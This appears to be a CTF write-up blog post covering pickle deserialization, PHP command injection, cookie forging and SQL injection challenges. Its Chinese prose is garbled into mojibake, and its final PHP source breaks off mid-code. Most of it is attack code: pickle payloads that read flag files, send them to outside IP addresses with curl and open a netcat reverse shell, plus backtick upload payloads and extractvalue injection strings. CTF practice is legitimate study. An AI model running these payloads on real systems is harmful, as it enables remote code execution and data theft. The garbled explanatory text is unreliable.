</span></span><span class="line"><span class="cl"><span class="err">ÂáΩÊï∞ÁöÑÂäüËÉΩÔºö‰ªé</span><span class="n">string‰∏≠ËØªÂá∫Â∫èÂàóÂåñÂâçÁöÑobjÂØπË±°</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="err">ÂèÇÊï∞ËÆ≤Ëß£Ôºö</span>
</span></span><span class="line"><span class="cl"><span class="n">string</span><span class="err">ÔºöÊñá‰ª∂ÂêçÁß∞„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="err">„ÄêÊ≥®„Äë</span> <span class="n">dump</span><span class="p">()</span> <span class="err">‰∏é</span> <span class="nb">load</span><span class="p">()</span> <span class="err">Áõ∏ÊØî</span> <span class="n">dumps</span><span class="p">()</span> <span class="err">Âíå</span> <span class="n">loads</span><span class="p">()</span> <span class="err">ËøòÊúâÂè¶‰∏ÄÁßçËÉΩÂäõÔºö</span><span class="n">dump</span><span class="p">()</span><span class="err">ÂáΩÊï∞ËÉΩ‰∏Ä‰∏™Êé•ÁùÄ‰∏Ä‰∏™Âú∞Â∞ÜÂá†‰∏™ÂØπË±°Â∫èÂàóÂåñÂ≠òÂÇ®Âà∞Âêå‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÔºåÈöèÂêéË∞ÉÁî®</span><span class="nb">load</span><span class="p">()</span><span class="err">Êù•‰ª•ÂêåÊ†∑ÁöÑÈ°∫Â∫èÂèçÂ∫èÂàóÂåñËØªÂá∫Ëøô‰∫õÂØπË±°„ÄÇËÄåÂú®</span><span class="n">__reduce__ÊñπÊ≥ïÈáåÈù¢Êàë‰ª¨Â∞±ËøõË°åËØªÂèñflag</span><span class="o">.</span><span class="n">txtÊñá‰ª∂</span><span class="err">ÔºåÂπ∂Â∞ÜËØ•Á±ªÂ∫èÂàóÂåñ‰πãÂêéËøõË°å</span><span class="n">URLÁºñÁ†Å</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">Ê£ÄÊµãÂèçÂ∫èÂàóÂåñÊñπÊ≥ïÔºöÂÖ®Â±ÄÊêúÁ¥¢</span><span class="n">Python‰ª£Á†Å‰∏≠ÊòØÂê¶Âê´ÊúâÂÖ≥ÈîÆÂ≠óÁ±ª‰ºº</span><span class="err">‚Äú</span><span class="n">import</span> <span class="n">cPickle</span><span class="err">‚ÄùÊàñ‚Äú</span><span class="n">import</span> <span class="n">pickle</span><span class="err">‚ÄùÁ≠âÔºåËã•Â≠òÂú®ÂàôËøõ‰∏ÄÊ≠•Á°ÆËÆ§ÊòØÂê¶Ë∞ÉÁî®</span><span class="n">cPickle</span><span class="o">.</span><span class="n">loads</span><span class="p">()</span><span class="err">Êàñ</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">()</span><span class="err">‰∏îÂèçÂ∫èÂàóÂåñÁöÑÂèÇÊï∞ÂèØÊéß„ÄÇ</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">payload</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&#34;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë¶ÅÂú®py2ÁéØÂ¢ÉÁî®</p>
<p>‰∏ãÈù¢Ëøô‰∏™ÊòØpy3ÁöÑËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">commands</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">payload</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">commands</span><span class="o">.</span><span class="n">getoutput</span><span class="p">,(</span><span class="s1">&#39;ls /&#39;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">payload</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂Âêécat /flag.txt</p>
<h2 id="Á∫¢ÊòéË∞∑ctf-2021write_shell">[Á∫¢ÊòéË∞∑CTF 2021]write_shell
</h2><p>action‰º†pwd,ÁúãÁõÆÂΩï</p>
<p>sandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">upload</span><span class="o">&amp;</span><span class="n">data</span><span class="o">=&lt;</span><span class="err">?</span><span class="o">=%</span><span class="mi">09</span><span class="err">`</span><span class="n">ls</span><span class="o">%</span><span class="mi">09</span><span class="o">/</span><span class="err">`?</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">upload</span><span class="o">&amp;</span><span class="n">data</span><span class="o">=&lt;</span><span class="err">?</span><span class="o">=%</span><span class="mi">09</span><span class="err">`</span><span class="n">cat</span><span class="o">%</span><span class="mi">09</span><span class="o">/</span><span class="n">flllllll1112222222lag</span><span class="err">`?</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>%09-&gt;Á©∫Ê†ºÔºåÂèçÂºïÂè∑ÂèØ‰ª•ÊâßË°åshellÂëΩ‰ª§</p>
<h2 id="watevrctf-2019pickle-store">[watevrCTF-2019]Pickle Store
</h2><p>ÊäìÂåÖÊãøcookie</p>
<p>‰∏Ä‰∏≤base64ÔºåÈ¢òÁõÆÊèêÁ§∫pickle,Ëß£Á†ÅÂêéÂèçÂ∫èÂàóÂåñ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#39;money&#39;: 500, &#39;history&#39;: [], &#39;anti_tamper_hmac&#39;: &#39;aa1ba4de55048cf20e0a7a63b7f8eb62&#39;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèØËßÅÂÖ∂‰∏≠Â∏¶‰∏ä‰∫ÜhmacÈ™åËØÅ„ÄÇ</p>
<p>Êé•‰∏ãÊù•ÊúÄÁÆÄÂçïÁöÑÊòØÁõ¥Êé•Âºπshell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,(</span><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;curl -d @flag.txt 174.0.157.204:2333&#39;)&#34;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,(</span><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;curl http://119.xxx.xxx.xxx/`cat flag.txt|base64`&#39;)&#34;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;nc 119.29.60.71 9999 -e/bin/sh&#39;)&#34;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖcookie‰º™ÈÄ†</p>
<p>È¶ñÂÖàÂèçÂ∫èÂàóÂåñÁöÑpickleÊµÅ‰∏≠ÂåÖÂê´‰∫ÜÁªôkeyËµãÂÄºÁöÑÊìç‰ΩúÔºåÂèçÂ∫èÂàóÂåñÂêékeyÂÄº‰ºöË¢´Ë¶ÜÁõñ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hmac</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;66666666666666666666666666666666&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;money&#34;</span><span class="p">:</span><span class="mi">10000</span><span class="p">,</span><span class="s2">&#34;history&#34;</span><span class="p">:[]}</span>
</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">cookies</span><span class="p">[</span><span class="s2">&#34;anti_tamper_hmac&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">result2</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result2</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÊää‰ΩôÈ¢ùËÆæÁΩÆ‰∏∫10000ÔºåÂπ∂Áî®Êàë‰ª¨Ëá™Â∑±ÁöÑkeyÊù•ÁªôcookieÂÅöÁ≠æÂêçÔºåÂæóÂà∞ÁöÑpickleÊµÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">b&#34;\x80\x03}q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#39;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="rctf2015easysql">[RCTF2015]EasySQL
</h2><p>ÂèëÁé∞Êúâ‰∫åÊ¨°Ê≥®ÂÖ•ÔºåÂú®‰øÆÊîπÂØÜÁ†ÅÊó∂Ëß¶Âèë</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e))#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250228000627331.png"
	width="471"
	height="64"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250228000627331_hu9611470971424810564.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250228000627331_hu16260475436898226828.png 1024w"
	loading="lazy"
	
		alt="image-20250228000627331"
	
	
		class="gallery-image" 
		data-flex-grow="735"
		data-flex-basis="1766px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#39;flag&#39;)))#
</span></span><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,(select(flag)from(flag))))#
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÅáflag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#39;users&#39;)))#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250228000812345.png"
	width="609"
	height="60"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250228000812345_hu17351778386634832415.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250228000812345_hu17158385183544697014.png 1024w"
	loading="lazy"
	
		alt="image-20250228000812345"
	
	
		class="gallery-image" 
		data-flex-grow="1015"
		data-flex-basis="2436px"
	
></p>
<p>Ê≤°ÂõûÊòæÂÆåÂÖ®Ôºå‰ΩÜÊòØmid,left,right,substrÈÉΩË¢´ËøáÊª§‰∫Ü</p>
<p>ËøôÈáåÁî®Âà∞Ê≠£ÂàôÂåπÈÖç<code>regexp('^f')</code>ÔºöÊü•ÊâæÂºÄÂ§¥fÁöÑÂ≠óÁ¨¶‰∏≤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)&amp;&amp;(column_name)regexp(&#39;^r&#39;))))#
</span></span><span class="line"><span class="cl">ÊàñËÄÖreverseÂáΩÊï∞ÂÄíËΩ¨
</span></span><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#39;users&#39;))))#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))))#
</span></span></code></pre></td></tr></table>
</div>
</div><p>extractvalueÊúÄÂ§öÂè™ËÉΩÊòæÁ§∫32‰ΩçÁöÑÂéüÂõ†ÔºåÊä•ÈîôÂõûÊòæ‰∏çËÉΩÂ§üÂÆåÂÖ®ÊòæÁ§∫flagÁöÑÂÄºÔºåÊàë‰ª¨ÂèØ‰ª•‰æùÁÑ∂‰ΩøÁî® reverse()ÂáΩÊï∞ÔºåÂ∞ÜflagÂÄºÂÄíÁΩÆËæìÂá∫ÔºåÂÜçÂà©Áî®sqlËØ≠Âè•Â∞ÜÂÄíÁΩÆÈÉ®ÂàÜÊÅ¢Â§çÔºåÂ∞ÜÂâçÂêé‰∏§ÈÉ®ÂàÜflagÊãºÊé•Âà∞‰∏ÄËµ∑ÔºåÂ∞±ÂèØ‰ª•Ëé∑ÂæóÂÆåÊï¥ÁöÑflagÂÄº„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))))#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="s1">&#39;}ca0da771c04c-e69b-dab4-3f8f-e3&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">b</span><span class="o">=</span><span class="n">a</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gwctf-2019ÊûØÁá•ÁöÑÊäΩÂ•ñ">[GWCTF 2019]ÊûØÁá•ÁöÑÊäΩÂ•ñ
</h2><p>Êü•ÁúãÊ∫êÁ†ÅÊúâ‰∏™check.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Ëøô‰∏çÊòØÊäΩÂ•ñÁ®ãÂ∫èÁöÑÊ∫ê‰ª£Á†ÅÔºÅ‰∏çËÆ∏ÁúãÔºÅ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Type: text/html;charset=utf-8&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;seed&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;seed&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">999999999</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;seed&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str_long1</span> <span class="o">=</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$len1</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$str</span><span class="o">.=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$str_long1</span><span class="p">,</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$str_long1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>       
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str_show</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;p id=&#39;p1&#39;&gt;&#34;</span><span class="o">.</span><span class="nv">$str_show</span><span class="o">.</span><span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
